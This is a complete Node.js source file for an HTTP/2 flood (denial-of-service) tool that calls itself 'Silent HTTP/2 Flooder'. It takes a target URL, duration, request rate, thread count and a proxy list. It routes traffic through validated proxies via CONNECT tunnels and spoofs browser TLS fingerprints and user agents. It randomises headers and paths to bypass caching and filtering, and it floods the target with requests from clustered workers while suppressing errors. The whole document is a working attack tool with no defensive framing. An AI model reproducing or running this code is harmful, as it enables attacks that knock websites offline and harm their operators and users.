const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require("dns").promises;
const fs = require("fs");
const colors = require("colors");
const v8 = require("v8");

const acceptHeaders = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera"];
const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512'
].join(':');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = `GREASE:${[defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":")}`;
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.SSL_OP_NO_TLSv1_3 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
  ciphers,
  sigalgs,
  honorCipherOrder: true,
  secureOptions,
  secureProtocol: "TLS_client_method"
});

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3], 10),
  rate: parseInt(process.argv[4], 10),
  threads: parseInt(process.argv[5], 10),
  proxyFile: process.argv[6]
};

if (process.argv.length < 6) {
  console.log('node flooder.js <target> <time> <rate> <threads> <proxyFile>'.rainbow);
  process.exit(1);
}

let proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(line => line.trim());
const parsedTarget = url.parse(args.target);
const MAX_RAM_PERCENTAGE = 65;
const RESTART_DELAY = 1000;

colors.enable();

async function validateProxy(proxy) {
  const [host, port] = proxy.split(":");
  return new Promise(resolve => {
    const socket = net.connect({ host, port, timeout: 3000 });
    socket.on("connect", () => {
      const tlsSocket = tls.connect({ socket, rejectUnauthorized: false, secureContext });
      tlsSocket.on("secureConnect", () => {
        tlsSocket.destroy();
        socket.destroy();
        resolve(true);
      });
      tlsSocket.on("error", () => {
        tlsSocket.destroy();
        socket.destroy();
        resolve(false);
      });
    });
    socket.on("error", () => {
      socket.destroy();
      resolve(false);
    });
    socket.on("timeout", () => {
      socket.destroy();
      resolve(false);
    });
  });
}

async function initializeProxies() {
  const liveProxies = [];
  for (const proxy of proxies) {
    if (await validateProxy(proxy)) {
      liveProxies.push(proxy);
    }
  }
  proxies = liveProxies.length > 0 ? liveProxies : proxies; // Fallback to original if no live proxies
}

if (cluster.isMaster) {
  console.clear();
  console.log(`[!] Silent HTTP/2 Flooder`.red);
  console.log(`--------------------------------------------`.gray);
  console.log(`[>] Heap Size:`.green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2).yellow, 'MB');
  console.log(`[>] Target: `.yellow + args.target.cyan);
  console.log(`[>] Time: `.magenta + args.time.toString().cyan, 'seconds');
  console.log(`[>] Rate: `.blue + args.rate.toString().cyan, 'req/s');
  console.log(`[>] Threads: `.red + args.threads.toString().cyan);
  console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
  console.log(`[>] Note: `.brightCyan + "Using live SSL proxies only. Silent operation enabled.".white);
  console.log(`--------------------------------------------`.gray);

  initializeProxies().then(() => {
    const restartScript = () => {
      for (const id in cluster.workers) {
        cluster.workers[id].kill();
      }
      setTimeout(() => {
        for (let i = 0; i < args.threads * 2; i++) {
          cluster.fork();
        }
      }, RESTART_DELAY);
    };

    const monitorRAM = () => {
      const totalRAM = os.totalmem();
      const usedRAM = totalRAM - os.freemem();
      const ramPercentage = (usedRAM / totalRAM) * 100;
      if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        restartScript();
      }
    };
    setInterval(monitorRAM, 5000);

    for (let i = 0; i < args.threads * 2; i++) {
      cluster.fork();
    }
  });
} else {
  setInterval(runFlooder, 1);
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const [addrHost, addrPort] = options.address.split(":");
    const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
      allowHalfOpen: true,
      writable: true,
      readable: true
    });

    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
        connection.destroy();
        return callback(null, null);
      }
      return callback(connection, null);
    });

    connection.on("error", () => connection.destroy());
    connection.on("timeout", () => connection.destroy());
  }
}

const Socker = new NetSocket();

const generateUserAgent = () => {
  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  const versions = {
    chrome: [128, 130],
    safari: [14, 16],
    brave: [128, 130],
    firefox: [99, 112],
    mobile: [85, 105],
    opera: [70, 90],
    operagx: [70, 90]
  };
  const [min, max] = versions[browser];
  const version = Math.floor(Math.random() * (max - min + 1)) + min;

  const userAgentMap = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
    mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
  };

  return userAgentMap[browser];
};

const generateRandomString = (minLength, maxLength) => {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
};

const prefixes = ['accept', 'access', 'access-control', 'access-control-allow', 'access-control-request', 'alt', 'content', 'content-security', 'content-security-policy', 'cross', 'cross-origin', 'if', 'origin', 'proxy', 'referer', 'sec', 'sec-ch', 'sec-ch-ua', 'sec-fetch', 'server', 'set', 'x', 'x-forwarded'];

const generateKey = () => {
  const keyLength = Math.floor(Math.random() * 3) + 3;
  const parts = new Set();
  while (parts.size < keyLength) {
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    parts.add(...prefix.split('-'));
  }
  return [...parts].slice(0, keyLength).join('-');
};

const generateHeaders = () => {
  const headersLength = Math.floor(Math.random() * 4) + 1;
  const baseHeaders = {
    'cache-control': 'no-cache',
    'sec-fetch-site': 'none',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-dest': 'document'
  };
  const dynamicHeaders = {};
  for (let i = 0; i < headersLength * 2; i++) {
    dynamicHeaders[generateKey()] = `${generateKey()}=${generateRandomString(5, 10)}`;
  }
  return {
    ...baseHeaders,
    ...dynamicHeaders
  };
};

function runFlooder() {
  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
  const [proxyHost, proxyPort] = proxy.split(":");
  const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

  const headers = {
    ":authority": Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`,
    ":method": "GET",
    ":path": Math.random() < 0.00001 ? `${parsedTarget.path}?search=${generateRandomString(2, 3)}&lr=${generateRandomString(2, 3)}` : `${parsedTarget.path}?search=null#${generateRandomString(2, 3)}&lr=${generateRandomString(2, 3)}`,
    ":scheme": "https",
    'sec-ch-ua-mobile': '?0',
    'upgrade-insecure-requests': '1',
    'user-agent': generateUserAgent(),
    'accept': acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)],
    'accept-encoding': 'br, gzip',
    'accept-language': 'en-US;q=0.9,en;q=0.8',
    ...generateHeaders()
  };

  Socker.HTTP({
    host: proxyHost,
    port: parseInt(proxyPort, 10),
    address: `${parsedTarget.host}:443`,
    timeout: 10
  }, (connection, error) => {
    if (!connection) return;

    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true);

    const tlsConn = tls.connect(parsedPort, parsedTarget.host, {
      port: parsedPort,
      secure: true,
      ALPNProtocols: ["h2", "http/1.1"],
      ciphers,
      sigalgs,
      requestCert: true,
      socket: connection,
      ecdhCurve,
      honorCipherOrder: false,
      rejectUnauthorized: false,
      secureOptions,
      secureContext,
      servername: parsedTarget.host,
      secureProtocol: "TLS_client_method"
    });

    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: true
      },
      maxSessionMemory: 3333,
      createConnection: () => tlsConn,
      socket: connection
    });

    client.setMaxListeners(0);
    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      maxFrameSize: 40000,
      enablePush: true
    });

    client.on("connect", () => {
      const interval = setInterval(() => {
        for (let i = 0; i < args.rate; i++) {
          const request = client.request(headers)
            .on("response", () => {
              request.close();
              request.destroy();
            })
            .on("error", () => {
              request.close();
              request.destroy();
            });
          request.end();
        }
      }, 550);
    });

    client.on("error", () => {
      client.destroy();
      connection.destroy();
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
    });
  });
}

setTimeout(() => process.exit(1), args.time * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
